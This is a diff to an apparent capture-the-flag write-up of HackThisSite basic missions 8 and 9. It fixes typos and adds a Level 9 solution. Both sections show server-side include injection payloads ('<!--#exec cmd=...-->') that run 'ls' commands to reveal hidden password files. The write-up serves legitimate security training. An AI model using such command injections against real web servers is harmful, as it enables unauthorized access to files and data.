@@ -74,11 +74,27 @@ The can just injection:
 <!--#exec cmd="ls .." -->
 ```
 
-Which will show is the files:
+Which will show the files:
 
 ```
 au12ha39vc.php index.php level8.php tmp
 ```
 
-We can finish of by going to <https://www.hackthissite.org/missions/basic/8/au12ha39vc.php> to see the password.
+We can finish off by going to <https://www.hackthissite.org/missions/basic/8/au12ha39vc.php> to see the password.
+
+#### Level 9
+This level hints that it is very similar to the previous level, and in fact we should use the vulnerability in the previous level's page to solve it.
+We need to go back to Level 8 and do a different injection to list the directory of level 9:
+
+```SSI
+<!--#exec cmd="ls ../../9" -->
+```
+
+Which will show the files:
+
+```
+index.php p91e283zc3.php
+```
+
+We can finish off by going to <https://www.hackthissite.org/missions/basic/9/p91e283zc3.php> to see the password.
 
